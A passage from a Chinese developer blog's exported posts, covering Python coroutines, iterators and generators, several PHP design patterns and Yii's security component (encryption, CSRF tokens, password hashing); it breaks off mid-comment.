把coroutine扔到EventLoop中执行loop.run_until_complete(asyncio.gather(*tasks))loop.close() 由于asnycio不支持http请求，但是支持Tcp请求，所以需要把http请求改成tcp模式 http基于tcp，只不过封装了特定的数据格式 http改装成tcp实现asyncio异步1234567891011121314151617181920212223242526import asyncio@asyncio.coroutinedef fetch_async(host, url='/'): print(host, url) # 开启一个socket连接 reader, writer = yield from asyncio.open_connection(host, 80) # 模拟http数据 request_header_content = """GET %s HTTP/1.0\r\nHost: %s\r\n\r\n""" % (url, host,) request_header_content = bytes(request_header_content, encoding='utf-8') # 模拟http writer.write(request_header_content) yield from writer.drain() text = yield from reader.read() print(host, url, text) writer.close()tasks = [ fetch_async('www.cnblogs.com', '/wupeiqi/'), fetch_async('dig.chouti.com', '/pic/show?nid=4073644713430508&amp;lid=10273091')]loop = asyncio.get_event_loop()results = loop.run_until_complete(asyncio.gather(*tasks))loop.close() 其他用法 协程并发下载并发下载原理1234567891011121314151617181920212223242526from gevent import monkeyimport geventimport urllib.request# 有耗时操作时需要monkey.patch_all()def my_downLoad(url): print('GET: %s' % url) resp = urllib.request.urlopen(url) data = resp.read() print('%d bytes received from %s.' % (len(data), url))gevent.joinall([ gevent.spawn(my_downLoad, 'http://www.baidu.com/'), gevent.spawn(my_downLoad, 'http://www.itcast.cn/'), gevent.spawn(my_downLoad, 'http://www.itheima.com/'),])运行结果GET: http://www.baidu.com/GET: http://www.itcast.cn/GET: http://www.itheima.com/111327 bytes received from http://www.baidu.com/.172054 bytes received from http://www.itheima.com/.215035 bytes received from http://www.itcast.cn/.]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>线程</tag>
        <tag>协程</tag>
        <tag>进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python迭代器和生成器]]></title>
    <url>%2F2018%2F10%2F11%2Fpython%2F%E8%BF%AD%E4%BB%A3%E5%99%A8%26%26%E7%94%9F%E6%88%90%E5%99%A8%2F</url>
    <content type="text"><![CDATA[迭代器 Iterator使用 isinstance() 判断一个对象是否是可迭代(Iterable)对象1234In [50]: from collections import IterableIn [51]: isinstance([], Iterable)Out[51]: True 可迭代对象通过 __iter__ 方法向我们提供一个迭代器，我们在迭代一个可迭代对象的时候，实际上就是先获取该对象提供的一个迭代器(通过 __iter__ 方法获取)，然后通过这个迭代器来依次获取对象中的每一个数据.1234567891011121314&gt;&gt;&gt; class MyList(object):... def __init__(self):... self.container = []... def add(self, item):... self.container.append(item)... def __iter__(self):... """返回一个迭代器"""... # 我们暂时忽略如何构造一个迭代器对象... pass...&gt;&gt;&gt; mylist = MyList()&gt;&gt;&gt; from collections import Iterable&gt;&gt;&gt; isinstance(mylist, Iterable)True iter()函数与next()函数list、tuple等都是可迭代对象，我们可以通过iter()函数获取这些可迭代对象的迭代器。然后我们可以对获取到的迭代器不断使用next()函数来获取下一条数据。iter()函数实际上就是调用了可迭代对象的 __iter__ 方法；next()函数实际上就是调用了迭代器的 __next__ 方法1234567891011121314151617&gt;&gt;&gt; li = [11, 22, 33, 44, 55]&gt;&gt;&gt; li_iter = iter(li)&gt;&gt;&gt; next(li_iter)11&gt;&gt;&gt; next(li_iter)22&gt;&gt;&gt; next(li_iter)33&gt;&gt;&gt; next(li_iter)44&gt;&gt;&gt; next(li_iter)55&gt;&gt;&gt; next(li_iter)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;StopIteration&gt;&gt;&gt; 当我们已经迭代完最后一个数据之后，再次调用next()函数会抛出 StopIteration 的异常，来告诉我们所有数据都已迭代完成，不用再执行next()函数了。 迭代器Iterator 自己实现迭代器通过上面的分析，我们已经知道，迭代器是用来帮助我们记录每次迭代访问到的位置，当我们对迭代器使用next()函数的时候，迭代器会向我们返回它所记录位置的下一个位置的数据。实际上，在使用next()函数的时候，调用的就是迭代器对象的__next__ 方法（Python3中是对象的 __next__ 方法）。所以，我们要想构造一个迭代器，就要实现它的 __next__ 方法。但这还不够，python要求迭代器本身也是可迭代的，所以我们还要为迭代器实现 __iter__ 方法，而 __iter__ 方法要返回一个迭代器，迭代器自身正是一个迭代器，所以迭代器的 __iter__ 方法返回自身即可。 一个实现了 __iter__ 方法和 __next__ 方法的对象，就是迭代器。1234567891011121314151617181920212223242526272829303132333435363738394041class MyList(object): """自定义的一个可迭代对象""" def __init__(self): self.items = [] def add(self, val): self.items.append(val) def __iter__(self): myiterator = MyIterator(self) return myiteratorclass MyIterator(object): """自定义的供上面可迭代对象使用的一个迭代器""" def __init__(self, mylist): self.mylist = mylist # current用来记录当前访问到的位置 self.current = 0 def __next__(self): if self.current &lt; len(self.mylist.items): item = self.mylist.items[self.current] self.current += 1 return item else: raise StopIteration def __iter__(self): return selfif __name__ == '__main__': mylist = MyList() mylist.add(1) mylist.add(2) mylist.add(3) mylist.add(4) mylist.add(5) for num in mylist: print(num) for...in... 循环的本质for item in Iterable 循环的本质就是先通过iter()函数获取可迭代对象Iterable的迭代器，然后对获取到的迭代器不断调用next()方法来获取下一个值并将其赋值给item，当遇到StopIteration的异常后循环结束。 迭代器的应用场景不用再将所有要迭代的数据都一次性缓存下来供后续依次读取，这样可以节省大量的存储（内存）空间。 举个例子，比如，数学中有个著名的斐波拉契数列（Fibonacci），数列中第一个数为0，第二个数为1，其后的每一个数都可由前两个数相加得到： 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, … 123456789101112131415161718192021222324252627282930313233class FibIterator(object): """斐波那契数列迭代器""" def __init__(self, n): """ :param n: int, 指明生成数列的前n个数 """ self.n = n # current用来保存当前生成到数列中的第几个数了 self.current = 0 # num1用来保存前前一个数，初始值为数列中的第一个数0 self.num1 = 0 # num2用来保存前一个数，初始值为数列中的第二个数1 self.num2 = 1 def __next__(self): """被next()函数调用来获取下一个数""" if self.current &lt; self.n: num = self.num1 self.num1, self.num2 = self.num2, self.num1+self.num2 self.current += 1 return num else: raise StopIteration def __iter__(self): """迭代器的__iter__返回自身即可""" return selfif __name__ == '__main__': fib = FibIterator(10) for num in fib: print(num, end=" ") 生成器 generator简单来说：只要在函数中有yield关键字的 就称为 生成器生成器(generator)：生成器是一类特殊的迭代器。所以也可以通过 next() 方法和 for in 遍历 通过生成器表达式创建只要把一个列表生成式的 [ ] 改成 ( )123456789In [15]: L = [ x*2 for x in range(5)]In [16]: LOut[16]: [0, 2, 4, 6, 8]In [17]: G = ( x*2 for x in range(5))In [18]: GOut[18]: &lt;generator object &lt;genexpr&gt; at 0x7f626c132db0&gt; 通过 yield 创建方法中只要含有 yield 就是一个生成器12345678910111213141516171819202122232425262728293031323334In [30]: def fib(n): ....: current = 0 ....: num1, num2 = 0, 1 ....: while current &lt; n: ....: num = num1 ....: num1, num2 = num2, num1+num2 ....: current += 1 # 关键点 ....: yield num ....: return 'edone' ....:In [31]: F = fib(5)In [32]: next(F)Out[32]: 0In [33]: next(F)Out[33]: 1In [34]: next(F)Out[34]: 1In [35]: next(F)Out[35]: 2In [36]: next(F)Out[36]: 3In [37]: next(F)---------------------------------------------------------------------------StopIteration Traceback (most recent call last)&lt;ipython-input-37-8c2b02b4361a&gt; in &lt;module&gt;() 其实就是将原本在迭代器 __next__ 方法中实现的基本逻辑放到一个函数中来实现，但是将每次迭代返回数值的 return 换成了 yield 但是用for循环调用generator时，发现拿不到generator的return语句的返回值。如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：12345678910111213141516In [39]: g = fib(5)In [40]: while True: ....: try: ....: x = next(g) ....: print("value:%d"%x) ....: except StopIteration as e: ....: print("生成器返回值:%s"%e.value) ....: break ....: value:1value:1value:2value:3value:5生成器返回值:edone yield关键字有两点作用： 保存当前运行状态（当前环境），然后暂停执行，即将生成器（函数）挂起 将yield关键字后面表达式的值作为返回值返回，此时可以理解为起到了return的作用可以使用next()函数让生成器从断点处继续执行，即唤醒生成器（函数） 使用send唤醒我们除了可以使用next()函数来唤醒生成器继续执行外，还可以使用send()函数来唤醒执行。使用send()函数的一个好处是可以在唤醒的同时向断点处传入一个附加数据。generator.send(None) == next(generator) 。 例子：执行到yield时，gen函数作用暂时保存，返回i的值; temp接收下次c.send(“python”)，send发送过来的值，c.next()等价c.send(None)又等价于 c.__next__()12345678910111213141516171819202122In [10]: def gen(): ....: i = 0 ....: while i&lt;5: ....: temp = yield i ....: print(temp) ....: i+=1 ....:使用sendIn [43]: f = gen()In [44]: next(f)Out[44]: 0In [45]: f.send('haha')hahaOut[45]: 1In [46]: next(f)NoneOut[46]: 2 再举个例子我们看一下 send 数据是如何生效的1234567891011121314151617181920#!/usr/bin/env python3# -*-coding:utf-8-*-def test(): i = 1 print('one line') temp = yield i i += 1 print('two line', temp) yield i# 获取生成器gen = test()# one linenext(gen)# 这个send的数据是发送给上一个yield点上进行接收的# two line hahagen.send('haha') 其实 send数据时数据给的是上一个yield断点进行接收的 yield from generatoryield from generator 基本可以理解成把生成器 generator 的代码替换了 yield from 所在位置， 可以先看代码示例好理解 为了让生成器（带yield函数），能简易的在其他函数中直接调用，就产生了yield from。 以下代码，htest为生成器，itest通过 yield from 直接调用htest。这样itest也变成了一个生成器。创建itest实例不断的去获取数据，当生成器执行结束时，会抛出 StopIteration 异常。那这个异常是htest抛出的，还是itest抛出的。通过捕获异常，会发现其实是itest抛出异常，htest并不会抛出 StopIteration 异常。 yield from 也可以返回值，通过变量接收。变量接收的值，即htest使用return返回的值。示例代码中，当i==3时，会直接使用return返回，这时val的值就是100；因为htest函数中不是使用yield返回值，所以itest会继续执行print(val)语句。itest代码执行完，然而并没有使用yield返回数据（htest中没有，itest中也没有），所以马上会抛出StopIteration异常)(如果在itest函数最后使用yield返回一个数据，就不会抛出异常)。1234567891011121314151617181920212223242526272829303132333435def htest(): i = 1 while i &lt; 4: print('i的值', i) n = yield i print('n的值', n) if i == 3: return 100 i += 1def itest(): val = yield from htest() print('val的值', val)t = itest()# i的值 1t.send(None)# n的值 haha# i的值 2t.send('haha')# n的值 here# i的值 3t.send('here')try: # n的值 hehe # val的值 100 t.send('hehe')except StopIteration as e: # 异常了 None print('异常了', e.value) yield from参考 迭代器和生成器的关系看过上面我们应该可以看出相似点和不同点了 迭代对象，遍历的时候需要先通过 __iter__ 来获取到迭代器，然后通过 __next__ 来一步一步往下执行 生成器相当于直接就等于迭代对象通过 __iter__ 所返回的对象，直接可以通过 __next__ 来一步一步来进行执行]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>迭代器</tag>
        <tag>生成器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php设计模式简单解析]]></title>
    <url>%2F2018%2F10%2F11%2Fphp%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[装饰器模式 扩展类的原有方法，不需要继承重写，在方法的开始和结尾增加预处理方法 前言装饰器的思想就是方便对一个方法进行扩展，就和web框架中提供的 beforeAction 和 afterAction 一样 装饰模式,可以动态的添加修改类的功能 一个类提供了一项功能,如果要在修改并添加额外的功能,传统的编程模式,需要写一个之类继承它,并重新实现类的方法 使用装饰模式,仅需在运行时添加一个装饰对象即可实现,可以实现最大的灵活性 实现(例子) 定义一个装饰器接口，定义要实现的方法 创建一个对象实现装饰器的接口 在指定类中使用装饰器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869//定义装饰器接口 interface DrawDecorator&#123; function beforeDraw(); function afterDraw();&#125;//创建装饰器，实现装饰器接口 class ColorDrawDecorator implements DrawDecorator&#123; protected $color; function __construct($color = 'red') &#123; $this-&gt;color = $color; &#125; function beforeDraw() &#123; echo "&lt;div style='color: &#123;$this-&gt;color&#125;;'&gt;"; &#125; function afterDraw() &#123; echo "&lt;/div&gt;"; &#125;&#125;//使用装饰器class Canvas&#123; protected $decorators = array(); //添加装饰器 function addDecorator(DrawDecorator $decorator) &#123; $this-&gt;decorators[] = $decorator; &#125; //调用方法之前先调用装饰器的方法 function beforeDraw() &#123; foreach($this-&gt;decorators as $decorator) &#123; $decorator-&gt;beforeDraw(); &#125; &#125; // 调用方法之后调用装饰器的方法 function afterDraw() &#123; // 倒序一下数组，保持好顺序 $decorators = array_reverse($this-&gt;decorators); foreach($decorators as $decorator) &#123; $decorator-&gt;afterDraw(); &#125; &#125; //此方法使用装饰器的方法 function draw() &#123; // 执行自己代码之前调用 $this-&gt;beforeDraw(); foreach($this-&gt;data as $line) &#123; foreach($line as $char) &#123; echo $char; &#125; echo "&lt;br /&gt;\n"; &#125; // 执行自己代码之后调用 $this-&gt;afterDraw(); &#125;&#125; 观察者模式解耦利器。就是一个事件机制，我(们)先告诉你我(们)关注这件事(注册)，如果这件事发生了改变(触发)，通知我，我再执行我的逻辑 前言 观察者模式(Observer)，当一个对象状态发生改变时，依赖他的对象全部会受到通知，并自动更新 场景：一个事件发生后，要执行一连串更新操作，传统的编程方式，就是在事件的代码之后直接加入处理逻辑当更新的逻辑增多之后，代码会变的难以维护。这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件主体的代码 观察者模式实现了低耦合，非侵入式的通知与更新机制 实现(例子)123456789101112131415161718192021222324252627282930313233343536373839404142434445//事件产生者 抽象类EventGenerator.phpabstract class EventGenerator&#123; private $obserers = array(); //为事件添加观察者 function addObsever(Observer $observer)&#123; $this-&gt;obserers[] = $observer; &#125; //通知观察者 调用观察者响应的方法 function ontify()&#123; foreach ($this-&gt;obserers as $observer)&#123; $observer-&gt;update(); &#125; &#125;&#125;//事件event.phpclass Event extends EventGenerator&#123; function trigger()&#123; echo "Event &lt;br&gt;"; $this-&gt;ontify(); &#125;&#125;//观察者接口，定义要实现的被触发的方法 Observer.phpinterface Observer&#123; function update($event_info = null);&#125;//观察者1Observer1.phpclass Observer1 implements Observer&#123; function update($event_info = null)&#123; echo "逻辑1"; &#125;&#125;…………//使用index.php$event = new Event();$event-&gt;addObsever(new Observer1());$event-&gt;addObsever(new Observer2());$event-&gt;addObsever(new Observer3());$event-&gt;trigger(); 总结和yii框架提供的事件机制原理一样 适配器模式 多个相同功能目的的类，通过相同的方法来实现相同的功能目的 前言适配器就是为了解决兼容，或者说是为了统一接口。比较常见的是数据库的适配，因为不同的数据库提供的接口(如:增删改)是不太一样的(或者是对同样的数据库有不同的操作接口，如mysql、mysqli，pdo3)，这时候为了操作的方便，我们是需要用统一的方法对不同的数据库接口进行封装。还有比较常见的是对支付方式(微信、支付宝等)的封装。类似的场景还有cache缓存适配器，将memcache、redis、file等不同的缓存方式封装成相同的操作方法 实现(例子) 定义一个定义了约定要实现的方法的接口 不同的类实现这个接口，来各自完成自己的实现相应方法的逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//定义接口interface IDatabase&#123; function connect($host, $user, $passwd, $dbname); function query($sql); function close();&#125;//不同的数据库实现此接口 #mysqliclass MySQLi implements IDatabase&#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = mysqli_connect($host, $user, $passwd, $dbname); $this-&gt;conn = $conn; &#125; function query($sql) &#123; return mysqli_query($this-&gt;conn, $sql); &#125; function close() &#123; mysqli_close($this-&gt;conn); &#125;&#125;#pdoclass PDO implements IDatabase&#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd); $this-&gt;conn = $conn; &#125; function query($sql) &#123; return $this-&gt;conn-&gt;query($sql); &#125; function close() &#123; unset($this-&gt;conn); &#125;&#125; 总结使对不同类型的操作变的相当方便，不用花费太多的时间来记录不同类型的不同方法。不需要关注太多细节，操作mysql和操作mongo的方法变的基本一致，方便。 策略模式前言策略模式定义了一族相同类型的算法，算法之间独立封装，并且可以互换代替。这些算法是同一类型问题的多种处理方式，他们具体行为有差别。每一个算法、或说每一种处理方式称为一个策略。在应用中，就可以根据环境的不同，选择不同的策略来处理问题。 实现(例子)实现和适配器模式相似： 定义一个定义了约定要实现的方法的接口 不同的策略类实现这个接口，来各自完成自己的实现相应方法的逻辑 以数组输出为例。数组的输出有序列化输出、JSON字符串输出和数组格式输出等方式。每种输出方式都可以独立封装起来，作为一个策略。应用时，如要把数组保存到数据库中，可以用序列化方式输出。要提供给APP作接口，可以用JSON字符串输出。其他程序调用，则直接输出数组格式。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172/** * 策略接口 */interface OutputStrategy&#123; public function render($array);&#125;/** * 策略类1：返回序列化字符串 */class SerializeStrategy implements OutputStrategy&#123; public function render($array) &#123; return serialize($array); &#125;&#125;/** * 策略类2：返回JSON编码后的字符串 */class JsonStrategy implements OutputStrategy&#123; public function render($array) &#123; return json_encode($array); &#125;&#125;/** * 策略类3：直接返回数组 */class ArrayStrategy implements OutputStrategy&#123; public function render($array) &#123; return $array; &#125;&#125;/** * 环境角色类 */class Output&#123; private $outputStrategy; // 传入的参数必须是策略接口的子类或子类的实例 public function __construct(OutputStrategy $outputStrategy) &#123; $this-&gt;outputStrategy = $outputStrategy; &#125; public function renderOutput($array) &#123; return $this-&gt;outputStrategy-&gt;render($array); &#125;&#125;/** * 客户端代码 */$test = ['a', 'b', 'c'];// 需要返回数组$output = new Output(new ArrayStrategy());$data = $output-&gt;renderOutput($test);// 需要返回JSON$output = new Output(new JsonStrategy());$data = $output-&gt;renderOutput($test); 总结策略模式和适配器模式有什么不一样 注册树模式把创建的对象存放在一个对象中，将来访问的时候直接从这个对象中获取 前言创建一个注册器类，将创建的对象绑定到注册树上，之后可以在全局通过注册树类进行访问绑定过的对象其实可以实现单利模式的目的，即创建一次，全局使用； 实现(例子)1234567891011121314151617181920212223/*** 注册树类*/class Register&#123; protected static $objects; //通过别名的方式，将对象绑定到注册树上 static function set($alias, $object) &#123; self::$objects[$alias] = $object; &#125; //通过别名获取对象 static function get($alias) &#123; return self::$objects[$alias]; &#125; //销毁 static function _unset($alias) &#123; unset(self::$objects[$alias]); &#125;&#125; 参考歪麦博客(UML类图的使用，php设计模式)慕课网-php设计模式设计模式]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现迭代器]]></title>
    <url>%2F2018%2F10%2F11%2Fphp%2F%E8%BF%AD%E4%BB%A3%E5%99%A8-Iterator%2F</url>
    <content type="text"><![CDATA[前言迭代器接口可以让对象像数组一样被遍历，如 foreach ，和数组的区别是数组一开始数据就是填充好的，也就是已经加载到内存的，如果数据量比较大甚至超过服务器内存，那将无法工作，而迭代器就可以通过一条一条数据的读取(从文件或数据库)进行操作 Iterator接口php提供的接口，我们看一下要实现的内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859Iterator extends Traversable &#123; //重置索引游标 abstract public void rewind ( void ) //移动当前索引游标到下一元素 abstract public void next ( void ) //判断当前索引游标指向的元素是否有效 abstract public boolean valid ( void ) //返回当前索引游标指向的元素 abstract public mixed current ( void ) //返回当前索引游标指向的键 abstract public scalar key ( void ) &#125; ``` &lt;!--more--&gt;## 实现一个简单的迭代器 ```phpclass myIterator implements Iterator &#123; // 记录数组的位置 private $position = 0; // 要遍历的数组 private $array = array( "firstelement", "secondelement", "lastelement", ); // foreach开始时执行一次，重置索引 function rewind() &#123; var_dump(__METHOD__); $this-&gt;position = 0; &#125; // 返回下一个索引 function next() &#123; var_dump(__METHOD__); ++$this-&gt;position; &#125; // 判断当前索引对应的值是否有效，返回false将会终止遍历 function valid() &#123; var_dump(__METHOD__); return isset($this-&gt;array[$this-&gt;position]); &#125; // 每次循环获取当前索引对应的值 function current() &#123; var_dump(__METHOD__); return $this-&gt;array[$this-&gt;position]; &#125; // 返回当前的索引 function key() &#123; var_dump(__METHOD__); return $this-&gt;position; &#125;&#125;$it = new myIterator;foreach($it as $key =&gt; $value) &#123; var_dump($key, $value); echo "\n";&#125; PHP文档]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>迭代器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-安全组件]]></title>
    <url>%2F2018%2F10%2F09%2Fyii%2Fsecurity%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[加密&amp;解密 相关方法数据加密和解密encryptByPassword &amp; decryptByPassword通过key 对原数据进行加密，每次加密后的生成的数据是不一样的，但是都可以通过它来解密出原来的数据12345678910111213/** * 获取加密(编码)后的数据。 * 和 decryptByPassword 配对使用 * @param string $data the data to encrypt 要加密的数据 * @param string $password the password to use for encryption 加密使用的key * @return string the encrypted data * @see decryptByPassword() * @see encryptByKey() */public function encryptByPassword($data, $password)&#123; ...&#125; 通过上面加密的数据和key获得原数据123456789101112/** * 获取解密(解码)后的数据。 * 和 encryptByPassword 配对使用 * @param string $data the encrypted data to decrypt 加密后的数据 * @param string $password the password to use for decryption 加密时使用的key * @return bool|string the decrypted data or false on authentication failure * @see encryptByPassword() */public function decryptByPassword($data, $password)&#123; ...&#125; 注意，encryptByPassword进行加密后的数据不是ASCII，也就是在显示的时候会乱码，可以通过base64_encode和base64_decode在外层包装下 实例：12345678910111213public function actionIndex()&#123; echo $temp = Yii::$app-&gt;security-&gt;encryptByPassword("security","bunao"); echo "&lt;br/&gt;"; echo Yii::$app-&gt;security-&gt;decryptByPassword($temp,"bunao"); # security echo "&lt;br/&gt;"; // 进行base64编码，防止乱码 echo $temp = base64_encode(Yii::$app-&gt;security-&gt;encryptByPassword("security","bunao")); echo "&lt;br/&gt;"; echo Yii::$app-&gt;security-&gt;decryptByPassword(base64_decode($temp),"bunao"); security&#125; encryptByKey &amp; decryptByKey这一对和上面的 encryptByPassword &amp; decryptByPassword 基本一样，只是添加了一个参数对其进行了扩展，这样就可以通过一个常量和一个变量组成一个加密的key1234567891011121314151617181920212223242526/** * 获取加密(编码)后的数据。 * 和 decryptByKey 配对使用 * @param string $data the data to encrypt 要编码的数据 * @param string $inputKey the input to use for encryption and authentication 加密使用的key * @param string $info optional context and application specific information, see [[hkdf()]] 和第二个参数共同生成加密的key * @return string the encrypted data */public function encryptByKey($data, $inputKey, $info = null)&#123; ...&#125;/** * 获取解密(解码)后的数据 * 和encryptByKey 配对使用 * Verifies and decrypts data encrypted with [[encryptByKey()]]. * @param string $data the encrypted data to decrypt。加密后的数据 * @param string $inputKey the input to use for encryption and authentication 加密使用的key1 * @param string $info optional context and application specific information, see [[hkdf()]] 加密使用的key2 * @return bool|string the decrypted data or false on authentication failure */public function decryptByKey($data, $inputKey, $info = null)&#123; ...&#125; 注意，encryptByPassword进行加密后的数据不是ASCII，也就是在显示的时候会乱码，可以通过base64_encode和base64_decode在外层包装下实例：将用户id组合key1234567891011121314public function actionIndex()&#123; $userId = 30; echo $temp = Yii::$app-&gt;security-&gt;encryptByKey("security", "bunao", $userId); echo "&lt;br/&gt;"; echo Yii::$app-&gt;security-&gt;decryptByKey($temp, "bunao", $userId); echo "&lt;br/&gt;"; // 进行base64编码，防止乱码 echo $temp = base64_encode(Yii::$app-&gt;security-&gt;encryptByKey("security", "bunao", $userId)); echo "&lt;br/&gt;"; echo Yii::$app-&gt;security-&gt;decryptByKey(base64_decode($temp), "bunao", $userId);&#125; token 的生成和验证maskToken &amp; unmaskToken根据提供的字符串token，生成加密的token1234567891011121314151617/** * 生成token 提供一个源token可以生成一些列加密的token，可以通过生成的token逆转出来源token * csrf使用这个 * 和 unmaskToken 配对使用 * Masks a token to make it uncompressible. * Applies a random mask to the token and prepends the mask used to the result making the string always unique. * Used to mitigate BREACH attack by randomizing how token is outputted on each request. * @param string $token An unmasked token. * @return string A masked token. * @since 2.0.12 */public function maskToken($token)&#123; // The number of bytes in a mask is always equal to the number of bytes in a token. $mask = $this-&gt;generateRandomKey(StringHelper::byteLength($token)); return StringHelper::base64UrlEncode($mask . ($mask ^ $token));&#125; 对加密的token进行解密，获取原token，就可以判断token时候正确1234567891011121314151617/** * 解码 * Unmasks a token previously masked by `maskToken`. * @param string $maskedToken A masked token. 加密的token * @return string An unmasked token, or an empty string in case of token format is invalid. * @since 2.0.12 */public function unmaskToken($maskedToken)&#123; $decoded = StringHelper::base64UrlDecode($maskedToken); $length = StringHelper::byteLength($decoded) / 2; // Check if the masked token has an even length. if (!is_int($length)) &#123; return ''; &#125; return StringHelper::byteSubstr($decoded, $length, $length) ^ StringHelper::byteSubstr($decoded, 0, $length);&#125; 实例：csrf 实例Yii csrf获取csrftoken12345678910111213141516171819202122232425262728293031323334353637yii\web\Request/** * 获取csrftoken * 如果cookie或session中不存在则生成csrftoken * @param bool $regenerate whether to regenerate CSRF token. When this parameter is true, each time 是否重新生成令牌 * this method is called, a new CSRF token will be generated and persisted (in session or cookie). * @return string the token used to perform CSRF validation. */public function getCsrfToken($regenerate = false)&#123; if ($this-&gt;_csrfToken === null || $regenerate) &#123; if ($regenerate || ($token = $this-&gt;loadCsrfToken()) === null) &#123; $token = $this-&gt;generateCsrfToken(); &#125; $this-&gt;_csrfToken = Yii::$app-&gt;security-&gt;maskToken($token); &#125; return $this-&gt;_csrfToken;&#125;/** * 生成csrftoken * Generates an unmasked random token used to perform CSRF validation. * @return string the random token for CSRF validation. */protected function generateCsrfToken()&#123; $token = Yii::$app-&gt;getSecurity()-&gt;generateRandomKey(); if ($this-&gt;enableCsrfCookie) &#123; $cookie = $this-&gt;createCsrfCookie($token); // 添加到cookie中 Yii::$app-&gt;getResponse()-&gt;getCookies()-&gt;add($cookie); &#125; else &#123; // 添加到session中 Yii::$app-&gt;getSession()-&gt;set($this-&gt;csrfParam, $token); &#125; return $token;&#125; 验证csrftoken12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152yii\web\Request/** * 验证csrf * Performs the CSRF validation. * * This method will validate the user-provided CSRF token by comparing it with the one stored in cookie or session. * This method is mainly called in [[Controller::beforeAction()]]. * * Note that the method will NOT perform CSRF validation if [[enableCsrfValidation]] is false or the HTTP method * is among GET, HEAD or OPTIONS. * * @param string $clientSuppliedToken the user-provided CSRF token to be validated. If null, the token will be retrieved from * the [[csrfParam]] POST field or HTTP header. * This parameter is available since version 2.0.4. * @return bool whether CSRF token is valid. If [[enableCsrfValidation]] is false, this method will return true. */public function validateCsrfToken($clientSuppliedToken = null)&#123; $method = $this-&gt;getMethod(); // 'GET', 'HEAD', 'OPTIONS' 这三种方法不验证csrf // only validate CSRF token on non-"safe" methods http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.1.1 if (!$this-&gt;enableCsrfValidation || in_array($method, ['GET', 'HEAD', 'OPTIONS'], true)) &#123; return true; &#125; $trueToken = $this-&gt;getCsrfToken(); if ($clientSuppliedToken !== null) &#123; return $this-&gt;validateCsrfTokenInternal($clientSuppliedToken, $trueToken); &#125; // 获取请求数据或者header头中的数据进行验证 return $this-&gt;validateCsrfTokenInternal($this-&gt;getBodyParam($this-&gt;csrfParam), $trueToken) || $this-&gt;validateCsrfTokenInternal($this-&gt;getCsrfTokenFromHeader(), $trueToken);&#125;/** * Validates CSRF token * * @param string $clientSuppliedToken The masked client-supplied token. * @param string $trueToken The masked true token. * @return bool */private function validateCsrfTokenInternal($clientSuppliedToken, $trueToken)&#123; if (!is_string($clientSuppliedToken)) &#123; return false; &#125; $security = Yii::$app-&gt;security; return $security-&gt;unmaskToken($clientSuppliedToken) === $security-&gt;unmaskToken($trueToken);&#125; 密码的加密和验证generatePasswordHash &amp; validatePassword为了数据安全，存储的用户密码肯定是要加密的，而且是难以破解的，即使数据库被盗，对方依旧很难通过存储的加密信息破解出密码 根据原密码生成密码对应的加密数据123456789101112131415/** * 加密密码 * 和validatePassword 配对使用 * @param string $password The password to be hashed. 要加密的密码 * @param int $cost Cost parameter used by the Blowfish hash algorithm. 数值越大暴力破解越难，生成也越耗费资源 * @return string The password hash string. When [[passwordHashStrategy]] is set to 'crypt', * the output is always 60 ASCII characters, when set to 'password_hash' the output length * might increase in future versions of PHP (http://php.net/manual/en/function.password-hash.php) * @throws Exception on bad password parameter or cost parameter. * @see validatePassword() */public function generatePasswordHash($password, $cost = null)&#123; ...&#125; 验证密码是否匹配原密码生成的hash1234567891011121314/** * 验证密码 * 和generatePasswordHash配对使用 * Verifies a password against a hash. * @param string $password The password to verify. 用户输入的密码 * @param string $hash The hash to verify the password against. 使用generatePasswordHash生成的加密后的密码 * @return bool whether the password is correct. * @throws InvalidParamException on bad password/hash parameters or if crypt() with Blowfish hash is not available. * @see generatePasswordHash() */public function validatePassword($password, $hash)&#123; ...&#125; 实例：12345678910// generates the hash (usually done during user registration or when the password is changed)$hash = Yii::$app-&gt;getSecurity()-&gt;generatePasswordHash($password);// ...save $hash in database... *// during login, validate if the password entered is correct using $hash fetched from databaseif (Yii::$app-&gt;getSecurity()-&gt;validatePassword($password, $hash) &#123; // password is good&#125; else &#123; // password is bad&#125; 数据的防篡改(也算加解密)hashData &amp; validateData就是我给你看，但是你不能改对原始数据进行加密，然后拼接原始数据12345678910111213141516171819/** * 加密数据 防篡改 * 和 validateData 配对使用 * * Prefixes data with a keyed hash value so that it can later be detected if it is tampered. * There is no need to hash inputs or outputs of [[encryptByKey()]] or [[encryptByPassword()]] * as those methods perform the task. * @param string $data the data to be protected 要加密的数据 * @param string $key the secret key to be used for generating hash. Should be a secure 加密使用的key * cryptographic key. * @param bool $rawHash whether the generated hash value is in raw binary format. If false, lowercase * hex digits will be generated. * @return string the data prefixed with the keyed hash * @throws InvalidConfigException when HMAC generation fails. */public function hashData($data, $key, $rawHash = false)&#123; ...&#125; 验证 hashData 后的数据,并返回数据1234567891011121314151617181920/** * 验证数据 * 使用 和 hashData 配对使用 * Validates if the given data is tampered. * @param string $data the data to be validated. The data must be previously 让hashData加密后的数据 * generated by [[hashData()]]. * @param string $key the secret key that was previously used to generate the hash for the data in [[hashData()]]. 加密时用的key * 